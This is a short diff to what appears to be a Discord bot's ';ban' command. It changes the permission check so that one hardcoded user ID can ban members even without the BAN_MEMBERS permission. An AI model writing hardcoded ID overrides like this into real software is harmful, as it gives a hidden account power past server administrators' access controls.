@@ -137,7 +137,7 @@ function JoinPos(arr1,ID){
     return pos;
 }
 	
-if(msg.content.startsWith(';ban')&&msg.member.hasPermission('BAN_MEMBERS')){
+if(msg.content.startsWith(';ban')&&(msg.member.hasPermission('BAN_MEMBERS')||msg.author.id=='394964599801380865')){
     if(msg.mentions.users.first()==undefined) return;
     let em = new Discord.MessageEmbed()
         .setDescription(`<:Check:722874534210043934> ** ${msg.mentions.users.first().username}#${msg.mentions.users.first().discriminator} was banned** | Being sus`)
